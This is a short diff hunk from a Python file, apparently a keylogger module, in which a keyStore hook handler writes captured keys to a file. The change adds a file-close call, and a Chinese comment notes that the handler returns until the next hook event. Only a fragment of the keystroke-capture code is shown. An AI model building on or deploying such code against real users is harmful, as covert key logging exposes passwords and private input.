@@ -66,6 +66,8 @@ def keyStore(event):
         else:
             fobj.write("[%s] " % event.Key)
 
+    fobj.close()
+
     # 返回直到下一个钩子事件被触发
     return True
 def run(**args):
